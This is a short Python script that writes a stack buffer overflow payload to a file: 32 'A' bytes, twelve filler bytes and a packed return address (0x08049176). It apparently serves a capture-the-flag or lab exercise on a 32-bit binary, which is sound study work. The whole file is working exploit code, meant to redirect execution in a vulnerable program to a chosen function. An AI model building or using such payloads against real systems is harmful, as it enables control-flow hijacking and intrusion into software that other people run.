import struct

def pack32(number):
    return struct.pack("<I", number)

def generate_payload():
    f = open("./payload_no_v2", "wb")
    payload = b""
    payload += b"A"*32
    payload += b"BBBB"
    payload += b"CCCC"
    payload += b"DDDD"
    payload += pack32(0x08049176)
    f.write(payload)
    f.close()

def main():
    generate_payload()

if __name__ == "__main__":
    main()
